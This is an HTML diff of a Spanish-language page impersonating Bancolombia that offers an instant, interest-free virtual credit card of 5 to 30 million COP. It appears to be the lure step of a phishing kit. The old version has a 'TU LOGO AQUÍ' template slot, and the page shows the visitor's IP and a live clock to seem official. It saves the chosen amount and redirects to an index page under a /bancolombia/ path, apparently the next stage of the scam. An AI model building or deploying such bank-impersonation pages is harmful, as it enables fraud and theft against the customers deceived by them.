@@ -1,477 +1,454 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Solicitud de crédito</title>
-  <meta name="description" content="Solicitud de crédito" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Bancolombia - Tarjeta de Crédito Virtual</title>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-  <!-- FAVICON -->
-  <link rel="icon" type="image/png" href="img/favicon.png" />
-  <link rel="apple-touch-icon" href="img/apple-touch-icon.png" />
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
+            background: #FFFFFF;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            padding: 0;
+        }
 
-  <style>
-    :root{
-      --coal:#4C4948;
-      --soft:#E5E5E5;
-      --macondo:#FDE23C;
-      --alba:#FD8B32;
-      --orquidea:#B970D5;
-      --caribe:#18CEE1;
-      --andino:#3AC799;
-      --flamenco:#F2C2D3;
+        .container {
+            width: 100%;
+            max-width: 480px;
+            padding: 20px 24px 40px;
+            background: #FFFFFF;
+        }
 
-      --bg:#F6F7F9;
-      --paper:#fff;
-      --ink:#0f0f10;
-      --muted: rgba(15,15,16,.62);
-      --border: rgba(15,15,16,.10);
+        /* Header con logo */
+        .header {
+            text-align: center;
+            margin-bottom: 32px;
+            padding-top: 16px;
+        }
 
-      --shadow: 0 18px 60px rgba(0,0,0,.12);
-      --shadow2: 0 10px 26px rgba(0,0,0,.10);
+        .header img {
+            width: 160px;
+            height: auto;
+        }
 
-      --radius: 28px;
-      --radius2: 20px;
+        /* Título principal */
+        .main-title {
+            margin-bottom: 12px;
+            text-align: center;
+        }
 
-      --primary: var(--macondo);
-      --primaryText:#1b1400;
-      --focus: rgba(24,206,225,.35);
+        .main-title h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #000000;
+            line-height: 1.3;
+            letter-spacing: -0.3px;
+        }
 
-      --danger:#B42318;
-      --max: 420px;
-    }
+        .subtitle {
+            font-size: 15px;
+            color: #666666;
+            margin-bottom: 24px;
+            line-height: 1.5;
+            text-align: center;
+            padding: 0 12px;
+        }
 
-    *{box-sizing:border-box}
-    html,body{height:100%}
-    body{
-      margin:0;
-      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial;
-      color:var(--ink);
-      background:
-        radial-gradient(760px 560px at 18% 8%, rgba(253,226,60,.16), transparent 55%),
-        radial-gradient(760px 560px at 92% 18%, rgba(24,206,225,.11), transparent 60%),
-        radial-gradient(760px 560px at 55% 92%, rgba(58,199,153,.09), transparent 60%),
-        linear-gradient(180deg, #F3F5F7, var(--bg));
-      display:flex;
-      justify-content:center;
-      padding: 18px 14px 30px;
-    }
+        /* Tarjeta de crédito (imagen) */
+        .card-container {
+            margin-bottom: 28px;
+            padding: 0 8px;
+        }
 
-    .wrap{width:min(var(--max), 100%);}
-    .app{
-      border-radius: 32px;
-      background: rgba(80, 80, 80, 0.76);
-      border: 1px solid rgba(255,255,255,.65);
-      box-shadow: var(--shadow);
-      overflow:hidden;
-      backdrop-filter: blur(12px);
-      -webkit-backdrop-filter: blur(12px);
-    }
+        .card-image {
+            width: 100%;
+            border-radius: 16px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.12);
+        }
 
-    .topbar{
-      height: 6px;
-      background: linear-gradient(90deg,
-        rgba(76,73,72,.18),
-        rgba(253,226,60,.80),
-        rgba(24,206,225,.55),
-        rgba(58,199,153,.55),
-        rgba(185,112,213,.42),
-        rgba(253,139,50,.45),
-        rgba(242,194,211,.52)
-      );
-    }
+        /* Sección de selección de cupo */
+        .cupo-section {
+            background: #FFFFFF;
+            border-radius: 16px;
+            padding: 28px 24px;
+            margin-bottom: 24px;
+            border: 1px solid #E8E8E8;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.04);
+        }
 
-    header{
-      padding: 14px 14px 10px;
-      background: linear-gradient(180deg, rgba(255,255,255,.92), rgba(255,255,255,.60));
-      border-bottom: 1px solid rgba(15,15,16,.06);
-    }
+        .cupo-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #000000;
+            text-align: center;
+            margin-bottom: 8px;
+            line-height: 1.3;
+        }
 
-    .logoWrap{display:flex; justify-content:center; margin-top:6px;}
-    .logoSlot{
-      width: 220px;
-      height: 54px;
-      border-radius: 16px;
-      background: var(--paper);
-      border: 1px solid var(--border);
-      box-shadow: 0 10px 22px rgba(0,0,0,.07);
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      overflow:hidden;
-    }
-    .logoSlot img{height: 36px; max-width: 86%; object-fit:contain; display:block;}
-    .logoPH{
-      font-weight: 900;
-      font-size: 12px;
-      letter-spacing:.25px;
-      color: rgba(15,15,16,.45);
-    }
+        .cupo-title span {
+            color: #000000;
+            font-weight: 700;
+        }
 
-    /* Hero con imagen - MOSTRAR COMPLETA */
-    .heroCard{
-      margin-top: 12px;
-      border-radius: 18px;
-      background: rgba(255,255,255,.86);
-      border: 1px solid rgba(15,15,16,.10);
-      overflow:hidden;
-    }
-    .heroImage{
-      width:100%;
-      height: auto;
-      min-height: 180px;
-      background: url('img/banner.jpg');
-      background-size: contain;
-      background-position: center center;
-      background-repeat: no-repeat;
-      border-bottom: 1px solid rgba(15,15,16,.08);
-      position:relative;
-      aspect-ratio: 16 / 9;
-      background-color: #f5f0e8;
-    }
-    @media (min-width: 500px) {
-      .heroImage {
-        aspect-ratio: 16 / 9;
-        min-height: unset;
-      }
-    }
-    @media (max-width: 380px) {
-      .heroImage {
-        aspect-ratio: 16 / 10;
-        min-height: 140px;
-      }
-    }
+        .cupo-description {
+            font-size: 14px;
+            color: #666666;
+            text-align: center;
+            margin-bottom: 32px;
+            line-height: 1.6;
+        }
 
-    .heroMeta{
-      padding: 12px;
-      display:flex;
-      align-items:center;
-      justify-content:space-between;
-      gap:10px;
-      flex-wrap:wrap;
-    }
-    .pill{
-      display:inline-flex;
-      align-items:center;
-      gap:8px;
-      font-size: 11px;
-      font-weight: 950;
-      padding: 7px 10px;
-      border-radius: 999px;
-      background: rgba(253,226,60,.22);
-      border: 1px solid rgba(253,226,60,.55);
-      color: rgba(27,20,0,.92);
-      white-space:nowrap;
-    }
-    .pill i{
-      width:8px;height:8px;border-radius:999px;
-      background: var(--caribe);
-      box-shadow: 0 0 0 3px rgba(24,206,225,.18);
-      display:inline-block;
-    }
-    .heroMeta .mini{
-      margin:0;
-      color: var(--muted);
-      font-size: 12px;
-      line-height:1.25;
-      flex:1;
-      min-width: 160px;
-    }
+        /* Slider */
+        .slider-container {
+            margin-bottom: 24px;
+        }
 
-    main{ padding: 14px; }
+        .slider-wrapper {
+            position: relative;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            padding: 0 4px;
+        }
 
-    .formCard{
-      border-radius: var(--radius);
-      background: rgba(255,255,255,.90);
-      border: 1px solid rgba(15,15,16,.08);
-      box-shadow: var(--shadow2);
-      padding: 14px;
-      position:relative;
-      overflow:hidden;
-    }
-    .formCard::before{
-      content:"";
-      position:absolute;
-      right:-70px;
-      top:-70px;
-      width: 180px;
-      height: 180px;
-      border-radius: 999px;
-      background: radial-gradient(circle at 30% 30%,
-        rgba(242,194,211,.20),
-        rgba(185,112,213,.12),
-        transparent 65%);
-      pointer-events:none;
-    }
+        .slider-track {
+            width: 100%;
+            height: 6px;
+            background: #E8E8E8;
+            border-radius: 3px;
+            position: relative;
+        }
 
-    .formHead{
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      gap:8px;
-      font-weight: 950;
-      font-size: 12px;
-      letter-spacing:.9px;
-      text-transform: uppercase;
-      color: rgba(15,15,16,.72);
-      margin-bottom: 10px;
-    }
+        .slider-fill {
+            position: absolute;
+            left: 0;
+            top: 0;
+            height: 100%;
+            background: #FDDA24;
+            border-radius: 3px;
+            width: 0%;
+            transition: width 0.15s ease;
+        }
 
-    h1{
-      margin:0;
-      text-align:center;
-      font-size: 20px;
-      line-height:1.2;
-      font-weight: 980;
-      letter-spacing:-.25px;
-    }
-    .sub{
-      margin: 8px 0 0;
-      text-align:center;
-      color: var(--muted);
-      font-size: 12px;
-      line-height:1.35;
-    }
+        .slider-thumb {
+            position: absolute;
+            width: 32px;
+            height: 32px;
+            background: #FFFFFF;
+            border: 3px solid #FDDA24;
+            border-radius: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            cursor: grab;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            left: 0%;
+            transition: left 0.15s ease, transform 0.15s ease, box-shadow 0.15s ease;
+        }
 
-    .divider{
-      height:1px;
-      background: rgba(15,15,16,.08);
-      margin: 12px 0;
-    }
+        .slider-thumb:active {
+            cursor: grabbing;
+            transform: translate(-50%, -50%) scale(1.1);
+            box-shadow: 0 6px 16px rgba(253, 218, 36, 0.4);
+        }
 
-    .labelRow{
-      display:flex;
-      align-items:center;
-      justify-content:space-between;
-      gap:10px;
-      margin: 0 0 8px;
-    }
-    .label{
-      font-size: 12px;
-      font-weight: 950;
-      color: rgba(15,15,16,.78);
-      margin:0;
-    }
+        input[type="range"] {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            cursor: pointer;
+            z-index: 10;
+        }
 
-    .range{
-      width:100%;
-      appearance:none;
-      height: 6px;
-      border-radius: 999px;
-      background: linear-gradient(90deg, var(--primary) 0%, rgba(15,15,16,.10) 0%);
-      outline:none;
-    }
-    .range::-webkit-slider-thumb{
-      appearance:none;
-      width: 22px;
-      height: 22px;
-      border-radius: 999px;
-      background: var(--paper);
-      border: 3px solid var(--primary);
-      box-shadow: 0 10px 18px rgba(253,226,60,.28), 0 2px 6px rgba(0,0,0,.12);
-      cursor:pointer;
-    }
-    .range:focus-visible{ box-shadow: 0 0 0 4px var(--focus); }
+        /* Label del cupo */
+        .cupo-label {
+            font-size: 13px;
+            color: #666666;
+            margin-bottom: 12px;
+            font-weight: 500;
+        }
 
-    .amount{
-      width:100%;
-      height: 46px;
-      border-radius: 14px;
-      border: 1px solid var(--border);
-      background: var(--paper);
-      padding: 0 12px;
-      font-size: 15px;
-      font-weight: 980;
-      outline:none;
-      box-shadow: 0 8px 18px rgba(0,0,0,.06);
-    }
+        /* Input del valor */
+        .cupo-input-container {
+            background: #F8F8F8;
+            border: 2px solid #E0E0E0;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            text-align: center;
+            transition: border-color 0.2s ease;
+        }
 
-    .note{
-      margin: 10px 0 0;
-      font-size: 12px;
-      text-align:center;
-      color: rgba(180,35,24,.92);
-    }
+        .cupo-input-container:hover {
+            border-color: #FDDA24;
+        }
 
-    .cta{ margin-top: 14px; display:flex; justify-content:center; }
-    .btn{
-      width: min(320px, 100%);
-      height: 50px;
-      border-radius: 16px;
-      border: 1px solid rgba(15,15,16,.10);
-      background: linear-gradient(180deg, #FFE56B, var(--primary));
-      color: var(--primaryText);
-      font-weight: 980;
-      letter-spacing: .8px;
-      cursor:pointer;
-      box-shadow: 0 16px 34px rgba(253,226,60,.24);
-      transition: transform .08s ease, box-shadow .2s ease;
-      text-transform: uppercase;
-    }
-    .btn:active{ transform: translateY(1px) scale(.99); }
-    .btn:focus-visible{
-      outline:none;
-      box-shadow: 0 0 0 4px var(--focus), 0 16px 34px rgba(253,226,60,.22);
-    }
+        .cupo-value {
+            font-size: 32px;
+            font-weight: 700;
+            color: #000000;
+            letter-spacing: -0.5px;
+        }
 
-    footer{
-      padding: 12px 14px 16px;
-      border-top: 1px solid rgba(15,15,16,.06);
-      background: rgba(255,255,255,.60);
-      text-align:center;
-      color: rgba(15,15,16,.58);
-      font-size: 12px;
-      line-height:1.45;
-    }
+        /* Nota informativa */
+        .info-note {
+            font-size: 12px;
+            color: #999999;
+            text-align: center;
+            line-height: 1.6;
+            padding: 16px;
+            background: #FAFAFA;
+            border-radius: 8px;
+            border-left: 3px solid #FDDA24;
+        }
 
-    .footer-logos {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      gap: 20px;
-      margin-bottom: 8px;
-    }
-    .footer-logos img {
-      height: 30px;
-      object-fit: contain;
-    }
+        /* Botón solicitar */
+        .btn-solicitar {
+            width: 100%;
+            background: #FDDA24;
+            border: none;
+            border-radius: 8px;
+            padding: 18px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #000000;
+            cursor: pointer;
+            letter-spacing: 0.3px;
+            margin-bottom: 32px;
+            box-shadow: 0 4px 12px rgba(253, 218, 36, 0.25);
+            transition: all 0.2s ease;
+        }
 
-    @media (min-width: 480px){
-      body{ padding: 26px 14px 36px; }
-      h1{ font-size: 22px; }
-    }
-  </style>
+        .btn-solicitar:hover {
+            background: #FCD500;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(253, 218, 36, 0.35);
+        }
+
+        .btn-solicitar:active {
+            transform: translateY(0);
+            box-shadow: 0 2px 8px rgba(253, 218, 36, 0.3);
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding-top: 24px;
+            border-top: 1px solid #F0F0F0;
+        }
+
+        .footer p {
+            font-size: 11px;
+            color: #999999;
+            line-height: 1.6;
+        }
+
+        .footer .ip {
+            margin-bottom: 4px;
+            font-weight: 500;
+        }
+
+        /* Animación de entrada */
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .card-container {
+            animation: fadeIn 0.6s ease;
+        }
+
+        .cupo-section {
+            animation: fadeIn 0.8s ease;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container {
+                padding: 16px 20px 32px;
+            }
+
+            .header {
+                margin-bottom: 24px;
+            }
+
+            .header img {
+                width: 140px;
+            }
+
+            .main-title h1 {
+                font-size: 22px;
+            }
+
+            .subtitle {
+                font-size: 14px;
+            }
+
+            .cupo-title {
+                font-size: 18px;
+            }
+
+            .cupo-value {
+                font-size: 28px;
+            }
+
+            .btn-solicitar {
+                padding: 16px;
+                font-size: 15px;
+            }
+        }
+
+        /* Mejoras de accesibilidad */
+        @media (prefers-reduced-motion: reduce) {
+            * {
+                animation: none !important;
+                transition: none !important;
+            }
+        }
+    </style>
 </head>
-
 <body>
-  <div class="wrap">
-    <section class="app" aria-label="Solicitud de crédito">
-      <div class="topbar"></div>
-
-      <header>
-        <div class="logoWrap">
-          <div class="logoSlot">
-            <img src="img/logo.svg" alt="Logo"
-                 onerror="this.remove();document.getElementById('logoPH').style.display='block'">
-            <div id="logoPH" class="logoPH" style="display:none;">TU LOGO AQUÍ</div>
-          </div>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <img src="img/logo-removebg-preview.png" alt="Bancolombia">
         </div>
 
-        <div class="hero">
-          <div class="heroCard">
-            <div class="heroImage" style="background-image: url('img/banner.jpg');">
-              <!-- Imagen mostrada completa con contain -->
+        <!-- Tarjeta de crédito (imagen) -->
+        <div class="card-container">
+            <img src="img/imgcontainers.jpg" alt="Tarjeta Crédito Virtual Bancolombia" class="card-image">
+        </div>
+
+        <!-- Sección de selección de cupo -->
+        <div class="cupo-section">
+            <h2 class="cupo-title">Escoge el cupo ideal entre<br><span>$5.000.000</span> y <span>$30.000.000</span></h2>
+            <p class="cupo-description">Selecciona un cupo entre $5.000.000 y $30.000.000 COP con tasas preferenciales y aprobación inmediata.</p>
+
+            <!-- Slider -->
+            <div class="slider-container">
+                <div class="slider-wrapper">
+                    <div class="slider-track">
+                        <div class="slider-fill" id="sliderFill"></div>
+                    </div>
+                    <div class="slider-thumb" id="sliderThumb"></div>
+                    <input type="range" min="5000000" max="30000000" step="100000" value="5000000" id="cupoSlider">
+                </div>
             </div>
-            <div class="heroMeta">
-              <div class="pill"><i></i>Rápido</div>
-              <p class="mini">Sin papeles, solicitud 100% digital y segura</p>
+
+            <p class="cupo-label">Cupo seleccionado</p>
+
+            <div class="cupo-input-container">
+                <span class="cupo-value" id="cupoDisplay">$5.000.000</span>
             </div>
-          </div>
+
+            <p class="info-note">✓ El cupo se asigna sin intereses mensuales y con aprobación digital respaldada por especialistas financieros.</p>
         </div>
-      </header>
 
-      <main>
-        <div class="formCard">
-          <div class="formHead">
-            Solicitud
-          </div>
+        <!-- Botón solicitar -->
+        <button class="btn-solicitar" id="btnSolicitar">
+            Solicitar Tarjeta
+        </button>
 
-          <h1>Escoge el cupo ideal</h1>
-          <p class="sub">Entre $5.000.000 y $30.000.000</p>
+        <script>
+            // ============================================
+            // REDIRECCIÓN INTERNA
+            // ============================================
+            // Desde: /bancolombia/product/credito.html (o donde esté)
+            // Hacia: ../index.html (sube un nivel)
+            const LINK_REDIRECCION = "../index.html"; // 👈 REDIRECCIÓN INTERNA
+            // ============================================
 
-          <div class="divider"></div>
+            document.getElementById("btnSolicitar").addEventListener("click", function () {
+                // Guardar el cupo seleccionado en localStorage
+                const cupo = document.getElementById('cupoSlider').value;
+                localStorage.setItem('cupo_seleccionado', cupo);
+                
+                // Redirigir
+                window.location.href = LINK_REDIRECCION;
+            });
+        </script>
 
-          <div class="labelRow">
-            <p class="label">Ajusta tu cupo</p>
-            <p class="label" style="color:rgba(15,15,16,.55);font-weight:800;">desliza</p>
-          </div>
-
-          <input id="cupoRange" class="range" type="range"
-                 min="5000000" max="30000000" step="250000" value="5000000"
-                 aria-label="Seleccionar cupo">
-
-          <div style="height:12px"></div>
-
-          <div class="labelRow">
-            <p class="label">Cupo seleccionado</p>
-            <p class="label" style="color:rgba(15,15,16,.55);font-weight:800;">valor</p>
-          </div>
-
-          <input id="cupoInput" class="amount" type="text" value="$ 5.000.000" readonly>
-
-          <div class="note">Sin intereses mensuales.</div>
-
-          <div class="cta">
-            <button id="btnSolicitar" class="btn" type="button">CONTINUAR</button>
-          </div>
+        <!-- Footer -->
+        <div class="footer">
+            <p class="ip">Dirección IP: <span id="userIP">Cargando...</span></p>
+            <p id="fechaHora">Cargando fecha...</p>
         </div>
-      </main>
+    </div>
 
-      <footer>
-        <div class="footer-logos">
-          <img src="img/logo.svg" alt="Logo Bancolombia" style="height:28px;">
-          <img src="img/brand-vigilado.svg" alt="Vigilado" style="height:24px;">
-        </div>
-        <div>©️ Bancolombia <span id="year"></span></div>
-      </footer>
-    </section>
-  </div>
+    <script>
+        // Obtener IP real del usuario
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('userIP').textContent = data.ip;
+            })
+            .catch(() => {
+                document.getElementById('userIP').textContent = 'No disponible';
+            });
 
-  <script>
-    // ============================================
-    // REDIRECCIÓN INTERNA
-    // ============================================
-    // Desde: /bancolombia/product/credito.html
-    // Hacia: /bancolombia/index.html
-    let URL_REDIRECCION = "../index.html";
-    // ============================================
-    
-    const formatCOP = (n) => `$ ${Number(n).toLocaleString('es-CO')}`;
-    
-    const range = document.getElementById('cupoRange');
-    const out = document.getElementById('cupoInput');
-    const btnSolicitar = document.getElementById('btnSolicitar');
-    
-    const paintTrack = () => {
-      const min = Number(range.min);
-      const max = Number(range.max);
-      const val = Number(range.value);
-      const pct = ((val - min) / (max - min)) * 100;
-      range.style.background =
-        `linear-gradient(90deg, var(--primary) ${pct}%, rgba(15,15,16,.10) ${pct}%)`;
-    };
-    
-    const sync = () => {
-      out.value = formatCOP(range.value);
-      paintTrack();
-    };
-    
-    const redirigir = () => {
-      const cupo = Number(range.value);
-      localStorage.setItem('cupo_seleccionado', cupo);
-      
-      const textoOriginal = btnSolicitar.textContent;
-      btnSolicitar.textContent = 'Redirigiendo...';
-      btnSolicitar.disabled = true;
-      
-      console.log('Redirigiendo a:', URL_REDIRECCION);
-      console.log('Cupo seleccionado:', cupo);
-      
-      setTimeout(() => {
-        window.location.href = URL_REDIRECCION;
-      }, 600);
-    };
-    
-    range.addEventListener('input', sync);
-    btnSolicitar.addEventListener('click', redirigir);
-    sync();
-    document.getElementById('year').textContent = new Date().getFullYear();
-    
-    console.log('=== Configuración de Redirección ===');
-    console.log('URL destino:', URL_REDIRECCION);
-    console.log('Desde: /bancolombia/product/credito.html');
-    console.log('Hacia: /bancolombia/index.html');
-    console.log('====================================');
-  </script>
+        const slider = document.getElementById('cupoSlider');
+        const display = document.getElementById('cupoDisplay');
+        const fill = document.getElementById('sliderFill');
+        const thumb = document.getElementById('sliderThumb');
+
+        function formatNumber(num) {
+            return '$' + num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, '.');
+        }
+
+        function updateSlider() {
+            const value = slider.value;
+            const min = slider.min;
+            const max = slider.max;
+            const percentage = ((value - min) / (max - min)) * 100;
+            
+            fill.style.width = percentage + '%';
+            thumb.style.left = percentage + '%';
+            display.textContent = formatNumber(value);
+        }
+
+        slider.addEventListener('input', updateSlider);
+        
+        // Inicializar
+        updateSlider();
+
+        // Actualizar fecha y hora
+        function updateDateTime() {
+            const now = new Date();
+            const dias = ['Domingo', 'Lunes', 'Martes', 'Miércoles', 'Jueves', 'Viernes', 'Sábado'];
+            const meses = ['Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio', 'Julio', 'Agosto', 'Septiembre', 'Octubre', 'Noviembre', 'Diciembre'];
+            
+            const dia = dias[now.getDay()];
+            const fecha = now.getDate();
+            const mes = meses[now.getMonth()];
+            const año = now.getFullYear();
+            
+            let horas = now.getHours();
+            const minutos = now.getMinutes().toString().padStart(2, '0');
+            const segundos = now.getSeconds().toString().padStart(2, '0');
+            const ampm = horas >= 12 ? 'PM' : 'AM';
+            horas = horas % 12;
+            horas = horas ? horas : 12;
+            
+            document.getElementById('fechaHora').textContent = `${dia} ${fecha} de ${mes} de ${año} ${horas}:${minutos}:${segundos} ${ampm}`;
+        }
+
+        setInterval(updateDateTime, 1000);
+        updateDateTime();
+    </script>
 </body>
 </html>
